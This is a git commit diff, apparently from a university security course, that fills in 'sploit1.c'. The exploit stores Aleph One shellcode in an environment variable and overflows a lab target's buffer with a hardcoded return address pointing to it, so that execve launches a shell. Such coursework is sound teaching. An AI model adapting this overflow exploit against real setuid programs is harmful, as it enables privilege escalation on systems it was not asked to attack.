055bc1dbe573420d65441255c7c6a5337cd7c2ae
Andrew <ajp294@cornell.edu>
2019-11-25 14:58:22 -0500

    Sploit1 done

--- sploits/sploit1.c
+++ sploits/sploit1.c
@@ -7,16 +7,33 @@
 
 #define TARGET "/tmp/target1"
 
+#define BUFFER_SIZE 408
+
 int main(void)
 {
   char *args[3]; 
-  char *env[1];
+  // char buffer[BUFFER_SIZE]; // Make larger size as target program?
+  char *env[2]; // Need environment variables
   
-  args[0] = TARGET;
-  args[1] = "student"; 
-  args[2] = NULL;
-  
-  env[0] = NULL;
+  // set an environment variable
+  int success = setenv("SHELLCODE", shellcodeAlephOne, 1);
+  char* env_ptr = getenv("SHELLCODE");
+  printf("Shellcode environment variable address: %p; success: %d\n", getenv("SHELLCODE"), success);
+  printf("Env ptr: 0x%x, %p\n", env_ptr, env_ptr);
+
+  // env_addr retrieved from running gdb and seeing where SHELLCODE env variable lives
+  // that value is hardcoded in shellcode.h
+  char env_buffer[12];
+  memcpy(env_buffer, env_addr, 4);
+  memcpy(env_buffer+4, env_addr, 4);
+  memcpy(env_buffer+8, env_addr, 4);
+
+  args[0] = TARGET; // Must contain filename of file being executed
+  args[1] = env_buffer; // overflow buffer with return address to environment variable holding shell code
+  args[2] = NULL; // argv and envp arrays must each include a null pointer at end of array
+
+  env[0] = env_ptr; // env_buffer or env_ptr?
+  env[1] = NULL; // Last byte value must be null at end
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
